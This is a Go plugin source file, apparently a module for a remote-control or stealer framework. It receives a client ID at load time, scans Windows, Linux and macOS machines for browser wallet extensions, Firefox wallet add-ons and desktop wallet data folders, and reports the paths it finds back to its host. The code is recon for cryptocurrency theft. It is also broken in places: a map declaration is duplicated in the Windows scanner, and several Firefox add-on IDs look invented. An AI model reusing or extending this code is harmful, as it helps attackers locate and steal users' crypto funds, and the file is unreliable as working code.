package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

type WalletResult struct {
	WalletType string `json:"walletType"`
	Location   string `json:"location"`
	Found      bool   `json:"found"`
}

type ScanReport struct {
	Wallets []WalletResult `json:"wallets"`
	Summary string         `json:"summary"`
}

var (
	hostInfo HostInfo
	sendFn   func(event string, payload []byte)
	mu       sync.Mutex
)

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[wallet-detect] marshal error: %v", err)
		return
	}
	fn(event, data)
}

func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	log.Printf("[wallet-detect] init: clientId=%s os=%s arch=%s", hostInfo.ClientID, hostInfo.OS, hostInfo.Arch)
	
	// Start wallet detection immediately
	go detectWallets()
	
	return nil
}

func handleEvent(event string, payload []byte) error {
	switch event {
	case "rescan":
		log.Printf("[wallet-detect] rescan requested")
		go detectWallets()
	default:
		log.Printf("[wallet-detect] unhandled event: %s", event)
	}
	return nil
}

func handleUnload() {
	log.Printf("[wallet-detect] unloading")
}

func detectWallets() {
	log.Printf("[wallet-detect] starting wallet scan on %s", hostInfo.OS)
	
	var wallets []WalletResult
	
	switch strings.ToLower(hostInfo.OS) {
	case "windows":
		wallets = scanWindowsWallets()
	case "linux":
		wallets = scanLinuxWallets()
	case "darwin":
		wallets = scanDarwinWallets()
	default:
		log.Printf("[wallet-detect] unsupported OS: %s", hostInfo.OS)
		sendEvent("scan_complete", ScanReport{
			Wallets: []WalletResult{},
			Summary: "unsupported_os",
		})
		return
	}
	
	// Filter to only found wallets
	foundWallets := []WalletResult{}
	walletTypes := []string{}
	for _, w := range wallets {
		if w.Found {
			foundWallets = append(foundWallets, w)
			walletTypes = append(walletTypes, w.WalletType)
		}
	}
	
	summary := "none"
	if len(foundWallets) > 0 {
		summary = strings.Join(walletTypes, ",")
	}
	
	report := ScanReport{
		Wallets: foundWallets,
		Summary: summary,
	}
	
	log.Printf("[wallet-detect] scan complete: found %d wallets", len(foundWallets))
	sendEvent("scan_complete", report)
}

func scanWindowsWallets() []WalletResult {
	results := []WalletResult{}
	
	userProfile := os.Getenv("USERPROFILE")
	if userProfile == "" {
		userProfile = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
	}
	
	appData := os.Getenv("APPDATA")
	localAppData := os.Getenv("LOCALAPPDATA")
	
	// Browser base paths
	browsers := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(localAppData, "Google\\Chrome\\User Data")},
		{"Edge", filepath.Join(localAppData, "Microsoft\\Edge\\User Data")},
		{"Brave", filepath.Join(localAppData, "BraveSoftware\\Brave-Browser\\User Data")},
		{"Opera", filepath.Join(appData, "Opera Software\\Opera Stable")},
		{"Opera GX", filepath.Join(appData, "Opera Software\\Opera GX Stable")},
	}
	
	// Extension IDs for detection
	extensionWallets := map[string]string{
	// Extension IDs for detection
	extensionWallets := map[string]string{
		"MetaMask":          "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":           "bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Binance Wallet":    "fhbohimaelbohpjbbldcngcnapndodjp",
		"Coinbase Wallet":   "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Trust Wallet":      "egjidjbpglichdcondbcbdnbeeppgdph",
		"Exodus":            "aholpfdialjgjfhomihkjbmgjidlcdno",
		"Rabby":             "acmacodkjbdgmoleebolmdjonilkdbch",
		"OKX Wallet":        "mcohilncbfahbmgdjkbpemcciiolgcge",
		"Math Wallet":       "afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Crypto.com Wallet": "hifafgmccdpekplomjjkcfgodnhcellj",
		"Ronin Wallet":      "fnjhmkhhmkbjkkabndcnnogagogbneec",
		"TronLink":          "ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"SafePal":           "lgmpcpglpngdoalbgeoldeajfclnhafa",
		"TokenPocket":       "mfgccjchihfkkindfppnaooecgfneiii",
		"XDEFI Wallet":      "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"Nami":              "lpfcbjknijpeeillifnkikgncikgfhdo",
		"Eternl":            "kmhcihpebfmpgmihbkipmjlmmioameka",
		"Keplr":             "dmkamcknogkgcdfhhbddcghachkejeap",
		"Petra Aptos":       "ejjladinnckdgjemekebdpeokbikhfci",
		"Solflare":          "bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Slope":             "pocmplpaccanhmnllbbkpgfliimjljgo",
		"Guarda":            "hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"Jaxx Liberty":      "cjelfplplebdjjenllpjcblmjkfcffne",
		"BitKeep":           "jiidiaalihmmhddjgbnbgdfflelocpak",
		"Core":              "agoakfejjabomempkjlepdflaleeobhb",
		"Coin98":            "aeachknmefphepccionboohckonoeemg",
		"Clover":            "nhnkbkgjikgcigadomkphalanndcapjk",
		"ioPay":             "ilnedeecficeofglkpjhdlgkgfcgfhka",
		"Wombat":            "amkmjjmmflddogmhpjloimipbofnfjih",
		"NeoLine":           "cphhlgmgameodnhkjdmkpanlelnlohao",
		"Terra Station":     "aiifbnbfobpmeekipheeijimdpnlpgpp",
		"Liquality":         "kpfopkelmapcoipemfendmdcghnegimn",
		"Guild":             "nanjmdknhkinifnkgdcggcfnhdaammmj",
		"Talisman":          "fijngjgcjhjmmpcmkeiomlglpeiijkld",
		"Polymesh":          "jojhfeoedkpkglbfimdfabpdfjaoolaf",
	}
	
	// Track found wallets to avoid duplicates
	foundWallets := make(map[string]string)
	
	// Scan each browser
	for _, browser := range browsers {
		if !pathExists(browser.path) {
			continue
		}
		
		// Get all profiles in this browser
		profiles := []string{"Default"}
		
		// Check for numbered profiles (Profile 1, Profile 2, etc.)
		for i := 1; i <= 10; i++ {
			profileName := fmt.Sprintf("Profile %d", i)
			profilePath := filepath.Join(browser.path, profileName)
			if pathExists(profilePath) {
				profiles = append(profiles, profileName)
			}
		}
		
		// Scan each profile for extensions
		for _, profile := range profiles {
			extensionsPath := filepath.Join(browser.path, profile, "Extensions")
			if !pathExists(extensionsPath) {
				continue
			}
			
			// Check each wallet extension
			for walletName, extID := range extensionWallets {
				extPath := filepath.Join(extensionsPath, extID)
				if pathExists(extPath) {
					// Store with browser and profile info to avoid duplicates
					key := walletName
					if _, exists := foundWallets[key]; !exists {
						location := fmt.Sprintf("%s (%s - %s)", extPath, browser.name, profile)
						foundWallets[key] = location
					}
				}
			}
		}
	}
	
	// Add found extensions to results
	for walletName, location := range foundWallets {
		results = append(results, WalletResult{
			WalletType: walletName,
			Location:   location,
			Found:      true,
		})
	}
	
	// Check for Brave Wallet (built-in, not an extension)
	braveWalletPath := filepath.Join(localAppData, "BraveSoftware\\Brave-Browser\\User Data\\Default\\brave_wallet")
	if pathExists(braveWalletPath) {
		results = append(results, WalletResult{
			WalletType: "Brave Wallet (Built-in)",
			Location:   braveWalletPath,
			Found:      true,
		})
	}
	
	// Check Firefox profiles (bonus - different structure)
	firefoxProfilesPath := filepath.Join(appData, "Mozilla\\Firefox\\Profiles")
	if pathExists(firefoxProfilesPath) {
		// Firefox uses different addon IDs (GUIDs), but we can check for known ones
		firefoxWallets := map[string]string{
			"MetaMask":        "webextension@metamask.io",
			"Phantom":         "{5d34d14d-8f5d-499d-9d35-b1c566a0b8fc}",
			"Binance Wallet":  "{6b6d4e16-e4c8-4e4d-9e4e-5a5f5d5e5f5d}",
			"Trust Wallet":    "{0b8e8c9c-9c9c-9c9c-9c9c-9c9c9c9c9c9c}",
		}
		
		profiles, err := os.ReadDir(firefoxProfilesPath)
		if err == nil {
			firefoxFound := make(map[string]string)
			for _, profile := range profiles {
				if profile.IsDir() {
					extensionsPath := filepath.Join(firefoxProfilesPath, profile.Name(), "extensions")
					if pathExists(extensionsPath) {
						// Check for specific wallet addons
						for walletName, addonID := range firefoxWallets {
							addonPath := filepath.Join(extensionsPath, addonID)
							if pathExists(addonPath) {
								if _, exists := firefoxFound[walletName]; !exists {
									firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", addonPath, profile.Name())
								}
							}
						}
						
						// Also check for XPI files (addon packages)
						xpiFiles, _ := filepath.Glob(filepath.Join(extensionsPath, "*.xpi"))
						if len(xpiFiles) > 0 {
							for walletName, addonID := range firefoxWallets {
								for _, xpiFile := range xpiFiles {
									if strings.Contains(strings.ToLower(filepath.Base(xpiFile)), strings.ToLower(walletName)) {
										if _, exists := firefoxFound[walletName]; !exists {
											firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", xpiFile, profile.Name())
										}
									}
								}
							}
						}
					}
				}
			}
			
			// Add Firefox findings
			for walletName, location := range firefoxFound {
				results = append(results, WalletResult{
					WalletType: walletName + " (Firefox)",
					Location:   location,
					Found:      true,
				})
			}
		}
	}
	
	// Desktop wallet applications
	desktopWallets := map[string][]string{
		"Exodus Desktop": {
			filepath.Join(appData, "Exodus"),
			filepath.Join(localAppData, "Programs\\Exodus"),
		},
		"Electrum": {
			filepath.Join(appData, "Electrum"),
			filepath.Join(localAppData, "Electrum"),
		},
		"Atomic Wallet": {
			filepath.Join(appData, "atomic"),
			filepath.Join(localAppData, "Programs\\atomic"),
		},
		"Bitcoin Core": {
			filepath.Join(appData, "Bitcoin"),
		},
		"Ethereum Wallet": {
			filepath.Join(appData, "Ethereum Wallet"),
		},
		"Monero GUI": {
			filepath.Join(userProfile, "Documents\\Monero"),
			filepath.Join(appData, "Monero"),
		},
		"Ledger Live": {
			filepath.Join(appData, "Ledger Live"),
			filepath.Join(localAppData, "Programs\\Ledger Live"),
		},
		"Trezor Suite": {
			filepath.Join(appData, "Trezor Suite"),
			filepath.Join(localAppData, "Programs\\Trezor Suite"),
		},
		"Binance Desktop": {
			filepath.Join(appData, "Binance"),
			filepath.Join(localAppData, "Programs\\Binance"),
		},
		"Trust Wallet Desktop": {
			filepath.Join(appData, "Trust Wallet"),
		},
		"Coinomi": {
			filepath.Join(appData, "Coinomi"),
			filepath.Join(localAppData, "Coinomi"),
		},
		"Jaxx Liberty Desktop": {
			filepath.Join(appData, "Jaxx Liberty"),
		},
		"Edge Wallet": {
			filepath.Join(appData, "Edge"),
		},
		"Guarda Desktop": {
			filepath.Join(appData, "Guarda"),
		},
		"Wasabi Wallet": {
			filepath.Join(appData, "WalletWasabi"),
		},
		"Samourai Wallet": {
			filepath.Join(appData, "Samourai"),
		},
		"Mycelium": {
			filepath.Join(appData, "Mycelium"),
		},
		"Blockchain.com Desktop": {
			filepath.Join(appData, "Blockchain"),
		},
		"Zcash": {
			filepath.Join(appData, "Zcash"),
		},
		"Dash Core": {
			filepath.Join(appData, "DashCore"),
		},
		"Litecoin Core": {
			filepath.Join(appData, "Litecoin"),
		},
		"Dogecoin Core": {
			filepath.Join(appData, "Dogecoin"),
		},
		"Daedalus": {
			filepath.Join(appData, "Daedalus"),
		},
		"Yoroi": {
			filepath.Join(appData, "Yoroi"),
		},
		"MultiBit": {
			filepath.Join(appData, "MultiBit"),
		},
		"Armory": {
			filepath.Join(appData, "Armory"),
		},
		"Bitcoin Knots": {
			filepath.Join(appData, "Bitcoin Knots"),
		},
		"Sparrow Wallet": {
			filepath.Join(appData, "Sparrow"),
		},
		"BlueWallet": {
			filepath.Join(appData, "BlueWallet"),
		},
		"Zap Wallet": {
			filepath.Join(appData, "Zap"),
		},
		"Phoenix Wallet": {
			filepath.Join(appData, "Phoenix"),
		},
		"Breez Wallet": {
			filepath.Join(appData, "Breez"),
		},
	}
	
	for wallet, paths := range desktopWallets {
		found := false
		foundPath := ""
		for _, p := range paths {
			if pathExists(p) {
				found = true
				foundPath = p
				break
			}
		}
		if found {
			results = append(results, WalletResult{
				WalletType: wallet,
				Location:   foundPath,
				Found:      true,
			})
		}
	}
	
	return results
}

func scanLinuxWallets() []WalletResult {
	results := []WalletResult{}
	
	home := os.Getenv("HOME")
	if home == "" {
		return results
	}
	
	// Browser base paths
	browsers := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(home, ".config/google-chrome")},
		{"Chromium", filepath.Join(home, ".config/chromium")},
		{"Brave", filepath.Join(home, ".config/BraveSoftware/Brave-Browser")},
		{"Edge", filepath.Join(home, ".config/microsoft-edge")},
		{"Opera", filepath.Join(home, ".config/opera")},
		{"Opera GX", filepath.Join(home, ".config/opera-gx")},
	}
	
	// Extension IDs for detection
	extensionWallets := map[string]string{
		"MetaMask":          "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":           "bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Binance Wallet":    "fhbohimaelbohpjbbldcngcnapndodjp",
		"Coinbase Wallet":   "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Trust Wallet":      "egjidjbpglichdcondbcbdnbeeppgdph",
		"Exodus":            "aholpfdialjgjfhomihkjbmgjidlcdno",
		"Rabby":             "acmacodkjbdgmoleebolmdjonilkdbch",
		"OKX Wallet":        "mcohilncbfahbmgdjkbpemcciiolgcge",
		"Math Wallet":       "afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Ronin Wallet":      "fnjhmkhhmkbjkkabndcnnogagogbneec",
		"TronLink":          "ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Keplr":             "dmkamcknogkgcdfhhbddcghachkejeap",
		"Solflare":          "bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Coin98":            "aeachknmefphepccionboohckonoeemg",
		"TokenPocket":       "mfgccjchihfkkindfppnaooecgfneiii",
		"SafePal":           "lgmpcpglpngdoalbgeoldeajfclnhafa",
	}
	
	// Track found wallets to avoid duplicates
	foundWallets := make(map[string]string)
	
	// Scan each browser
	for _, browser := range browsers {
		if !pathExists(browser.path) {
			continue
		}
		
		// Get all profiles
		profiles := []string{"Default"}
		
		// Check for numbered profiles
		for i := 1; i <= 10; i++ {
			profileName := fmt.Sprintf("Profile %d", i)
			profilePath := filepath.Join(browser.path, profileName)
			if pathExists(profilePath) {
				profiles = append(profiles, profileName)
			}
		}
		
		// Scan each profile
		for _, profile := range profiles {
			extensionsPath := filepath.Join(browser.path, profile, "Extensions")
			if !pathExists(extensionsPath) {
				continue
			}
			
			// Check each wallet
			for walletName, extID := range extensionWallets {
				extPath := filepath.Join(extensionsPath, extID)
				if pathExists(extPath) {
					key := walletName
					if _, exists := foundWallets[key]; !exists {
						location := fmt.Sprintf("%s (%s - %s)", extPath, browser.name, profile)
						foundWallets[key] = location
					}
				}
			}
		}
	}
	
	// Add found extensions
	for walletName, location := range foundWallets {
		results = append(results, WalletResult{
			WalletType: walletName,
			Location:   location,
			Found:      true,
		})
	}
	
	// Check for Brave Wallet (built-in)
	braveWalletPath := filepath.Join(home, ".config/BraveSoftware/Brave-Browser/Default/brave_wallet")
	if pathExists(braveWalletPath) {
		results = append(results, WalletResult{
			WalletType: "Brave Wallet (Built-in)",
			Location:   braveWalletPath,
			Found:      true,
		})
	}
	
	// Check Firefox
	firefoxPath := filepath.Join(home, ".mozilla/firefox")
	if pathExists(firefoxPath) {
		firefoxWallets := map[string]string{
			"MetaMask":        "webextension@metamask.io",
			"Phantom":         "{5d34d14d-8f5d-499d-9d35-b1c566a0b8fc}",
			"Binance Wallet":  "{6b6d4e16-e4c8-4e4d-9e4e-5a5f5d5e5f5d}",
			"Trust Wallet":    "{0b8e8c9c-9c9c-9c9c-9c9c-9c9c9c9c9c9c}",
		}
		
		profiles, err := os.ReadDir(firefoxPath)
		if err == nil {
			firefoxFound := make(map[string]string)
			for _, profile := range profiles {
				if profile.IsDir() && (strings.Contains(profile.Name(), ".default") || strings.Contains(profile.Name(), ".default-release")) {
					extensionsPath := filepath.Join(firefoxPath, profile.Name(), "extensions")
					if pathExists(extensionsPath) {
						// Check for specific wallet addons
						for walletName, addonID := range firefoxWallets {
							addonPath := filepath.Join(extensionsPath, addonID)
							if pathExists(addonPath) {
								if _, exists := firefoxFound[walletName]; !exists {
									firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", addonPath, profile.Name())
								}
							}
						}
						
						// Check for XPI files
						xpiFiles, _ := filepath.Glob(filepath.Join(extensionsPath, "*.xpi"))
						if len(xpiFiles) > 0 {
							for walletName, _ := range firefoxWallets {
								for _, xpiFile := range xpiFiles {
									if strings.Contains(strings.ToLower(filepath.Base(xpiFile)), strings.ToLower(walletName)) {
										if _, exists := firefoxFound[walletName]; !exists {
											firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", xpiFile, profile.Name())
										}
									}
								}
							}
						}
					}
				}
			}
			
			// Add Firefox findings
			for walletName, location := range firefoxFound {
				results = append(results, WalletResult{
					WalletType: walletName + " (Firefox)",
					Location:   location,
					Found:      true,
				})
			}
		}
	}
	
	// Desktop wallet applications
	desktopWallets := map[string][]string{
		"Exodus Desktop": {
			filepath.Join(home, ".config/Exodus"),
			filepath.Join(home, ".local/share/Exodus"),
		},
		"Electrum": {
			filepath.Join(home, ".electrum"),
		},
		"Atomic Wallet": {
			filepath.Join(home, ".atomic"),
		},
		"Bitcoin Core": {
			filepath.Join(home, ".bitcoin"),
		},
		"Ethereum Wallet": {
			filepath.Join(home, ".ethereum"),
		},
		"Monero GUI": {
			filepath.Join(home, "Monero"),
			filepath.Join(home, ".bitmonero"),
		},
		"Ledger Live": {
			filepath.Join(home, ".config/Ledger Live"),
		},
		"Binance Desktop": {
			filepath.Join(home, ".config/Binance"),
		},
		"Trust Wallet Desktop": {
			filepath.Join(home, ".config/trust-wallet"),
		},
		"Coinomi": {
			filepath.Join(home, ".coinomi"),
		},
		"Jaxx Liberty Desktop": {
			filepath.Join(home, ".config/Jaxx Liberty"),
		},
		"Edge Wallet": {
			filepath.Join(home, ".config/edge"),
		},
		"Guarda Desktop": {
			filepath.Join(home, ".config/Guarda"),
		},
		"Wasabi Wallet": {
			filepath.Join(home, ".walletwasabi"),
		},
		"Zcash": {
			filepath.Join(home, ".zcash"),
		},
		"Dash Core": {
			filepath.Join(home, ".dashcore"),
		},
		"Litecoin Core": {
			filepath.Join(home, ".litecoin"),
		},
		"Dogecoin Core": {
			filepath.Join(home, ".dogecoin"),
		},
		"Daedalus": {
			filepath.Join(home, ".local/share/Daedalus"),
		},
		"Yoroi": {
			filepath.Join(home, ".config/Yoroi"),
		},
		"Sparrow Wallet": {
			filepath.Join(home, ".sparrow"),
		},
		"Specter Desktop": {
			filepath.Join(home, ".specter"),
		},
		"BlueWallet": {
			filepath.Join(home, ".config/BlueWallet"),
		},
	}
	
	for wallet, paths := range desktopWallets {
		found := false
		foundPath := ""
		for _, p := range paths {
			if pathExists(p) {
				found = true
				foundPath = p
				break
			}
		}
		if found {
			results = append(results, WalletResult{
				WalletType: wallet,
				Location:   foundPath,
				Found:      true,
			})
		}
	}
	
	return results
}

func scanDarwinWallets() []WalletResult {
	results := []WalletResult{}
	
	home := os.Getenv("HOME")
	if home == "" {
		return results
	}
	
	// Browser base paths
	browsers := []struct {
		name string
		path string
	}{
		{"Chrome", filepath.Join(home, "Library/Application Support/Google/Chrome")},
		{"Brave", filepath.Join(home, "Library/Application Support/BraveSoftware/Brave-Browser")},
		{"Edge", filepath.Join(home, "Library/Application Support/Microsoft Edge")},
		{"Opera", filepath.Join(home, "Library/Application Support/com.operasoftware.Opera")},
		{"Opera GX", filepath.Join(home, "Library/Application Support/com.operasoftware.OperaGX")},
	}
	
	// Extension IDs for detection
	extensionWallets := map[string]string{
		"MetaMask":          "nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Phantom":           "bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Binance Wallet":    "fhbohimaelbohpjbbldcngcnapndodjp",
		"Coinbase Wallet":   "hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Trust Wallet":      "egjidjbpglichdcondbcbdnbeeppgdph",
		"Exodus":            "aholpfdialjgjfhomihkjbmgjidlcdno",
		"Rabby":             "acmacodkjbdgmoleebolmdjonilkdbch",
		"OKX Wallet":        "mcohilncbfahbmgdjkbpemcciiolgcge",
		"Math Wallet":       "afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Ronin Wallet":      "fnjhmkhhmkbjkkabndcnnogagogbneec",
		"TronLink":          "ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Keplr":             "dmkamcknogkgcdfhhbddcghachkejeap",
		"Solflare":          "bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Coin98":            "aeachknmefphepccionboohckonoeemg",
		"TokenPocket":       "mfgccjchihfkkindfppnaooecgfneiii",
		"SafePal":           "lgmpcpglpngdoalbgeoldeajfclnhafa",
	}
	
	// Track found wallets to avoid duplicates
	foundWallets := make(map[string]string)
	
	// Scan each browser
	for _, browser := range browsers {
		if !pathExists(browser.path) {
			continue
		}
		
		// Get all profiles
		profiles := []string{"Default"}
		
		// Check for numbered profiles
		for i := 1; i <= 10; i++ {
			profileName := fmt.Sprintf("Profile %d", i)
			profilePath := filepath.Join(browser.path, profileName)
			if pathExists(profilePath) {
				profiles = append(profiles, profileName)
			}
		}
		
		// Scan each profile
		for _, profile := range profiles {
			extensionsPath := filepath.Join(browser.path, profile, "Extensions")
			if !pathExists(extensionsPath) {
				continue
			}
			
			// Check each wallet
			for walletName, extID := range extensionWallets {
				extPath := filepath.Join(extensionsPath, extID)
				if pathExists(extPath) {
					key := walletName
					if _, exists := foundWallets[key]; !exists {
						location := fmt.Sprintf("%s (%s - %s)", extPath, browser.name, profile)
						foundWallets[key] = location
					}
				}
			}
		}
	}
	
	// Add found extensions
	for walletName, location := range foundWallets {
		results = append(results, WalletResult{
			WalletType: walletName,
			Location:   location,
			Found:      true,
		})
	}
	
	// Check for Brave Wallet (built-in)
	braveWalletPath := filepath.Join(home, "Library/Application Support/BraveSoftware/Brave-Browser/Default/brave_wallet")
	if pathExists(braveWalletPath) {
		results = append(results, WalletResult{
			WalletType: "Brave Wallet (Built-in)",
			Location:   braveWalletPath,
			Found:      true,
		})
	}
	
	// Check Firefox
	firefoxPath := filepath.Join(home, "Library/Application Support/Firefox/Profiles")
	if pathExists(firefoxPath) {
		firefoxWallets := map[string]string{
			"MetaMask":        "webextension@metamask.io",
			"Phantom":         "{5d34d14d-8f5d-499d-9d35-b1c566a0b8fc}",
			"Binance Wallet":  "{6b6d4e16-e4c8-4e4d-9e4e-5a5f5d5e5f5d}",
			"Trust Wallet":    "{0b8e8c9c-9c9c-9c9c-9c9c-9c9c9c9c9c9c}",
		}
		
		profiles, err := os.ReadDir(firefoxPath)
		if err == nil {
			firefoxFound := make(map[string]string)
			for _, profile := range profiles {
				if profile.IsDir() {
					extensionsPath := filepath.Join(firefoxPath, profile.Name(), "extensions")
					if pathExists(extensionsPath) {
						// Check for specific wallet addons
						for walletName, addonID := range firefoxWallets {
							addonPath := filepath.Join(extensionsPath, addonID)
							if pathExists(addonPath) {
								if _, exists := firefoxFound[walletName]; !exists {
									firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", addonPath, profile.Name())
								}
							}
						}
						
						// Check for XPI files
						xpiFiles, _ := filepath.Glob(filepath.Join(extensionsPath, "*.xpi"))
						if len(xpiFiles) > 0 {
							for walletName, _ := range firefoxWallets {
								for _, xpiFile := range xpiFiles {
									if strings.Contains(strings.ToLower(filepath.Base(xpiFile)), strings.ToLower(walletName)) {
										if _, exists := firefoxFound[walletName]; !exists {
											firefoxFound[walletName] = fmt.Sprintf("%s (Firefox - %s)", xpiFile, profile.Name())
										}
									}
								}
							}
						}
					}
				}
			}
			
			// Add Firefox findings
			for walletName, location := range firefoxFound {
				results = append(results, WalletResult{
					WalletType: walletName + " (Firefox)",
					Location:   location,
					Found:      true,
				})
			}
		}
	}
	
	// Desktop wallet applications
	desktopWallets := map[string][]string{
		"Exodus Desktop": {
			filepath.Join(home, "Library/Application Support/Exodus"),
		},
		"Electrum": {
			filepath.Join(home, ".electrum"),
			filepath.Join(home, "Library/Application Support/Electrum"),
		},
		"Atomic Wallet": {
			filepath.Join(home, "Library/Application Support/atomic"),
		},
		"Bitcoin Core": {
			filepath.Join(home, "Library/Application Support/Bitcoin"),
		},
		"Ethereum Wallet": {
			filepath.Join(home, "Library/Application Support/Ethereum Wallet"),
		},
		"Monero GUI": {
			filepath.Join(home, "Library/Application Support/Monero"),
			filepath.Join(home, "Documents/Monero"),
		},
		"Ledger Live": {
			filepath.Join(home, "Library/Application Support/Ledger Live"),
		},
		"Trezor Suite": {
			filepath.Join(home, "Library/Application Support/Trezor Suite"),
		},
		"Binance Desktop": {
			filepath.Join(home, "Library/Application Support/Binance"),
		},
		"Trust Wallet Desktop": {
			filepath.Join(home, "Library/Application Support/Trust Wallet"),
		},
		"Coinomi": {
			filepath.Join(home, "Library/Application Support/Coinomi"),
		},
		"Jaxx Liberty Desktop": {
			filepath.Join(home, "Library/Application Support/Jaxx Liberty"),
		},
		"Edge Wallet": {
			filepath.Join(home, "Library/Application Support/Edge"),
		},
		"Guarda Desktop": {
			filepath.Join(home, "Library/Application Support/Guarda"),
		},
		"Wasabi Wallet": {
			filepath.Join(home, "Library/Application Support/WalletWasabi"),
		},
		"Zcash": {
			filepath.Join(home, "Library/Application Support/Zcash"),
		},
		"Dash Core": {
			filepath.Join(home, "Library/Application Support/DashCore"),
		},
		"Litecoin Core": {
			filepath.Join(home, "Library/Application Support/Litecoin"),
		},
		"Dogecoin Core": {
			filepath.Join(home, "Library/Application Support/Dogecoin"),
		},
		"Daedalus": {
			filepath.Join(home, "Library/Application Support/Daedalus"),
		},
		"Yoroi": {
			filepath.Join(home, "Library/Application Support/Yoroi"),
		},
		"Sparrow Wallet": {
			filepath.Join(home, "Library/Application Support/Sparrow"),
		},
		"BlueWallet": {
			filepath.Join(home, "Library/Application Support/BlueWallet"),
		},
	}
	
	for wallet, paths := range desktopWallets {
		found := false
		foundPath := ""
		for _, p := range paths {
			if pathExists(p) {
				found = true
				foundPath = p
				break
			}
		}
		if found {
			results = append(results, WalletResult{
				WalletType: wallet,
				Location:   foundPath,
				Found:      true,
			})
		}
	}
	
	return results
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func init() {
	log.SetPrefix("[wallet-detect] ")
	log.Printf("plugin loaded on %s/%s", runtime.GOOS, runtime.GOARCH)
}
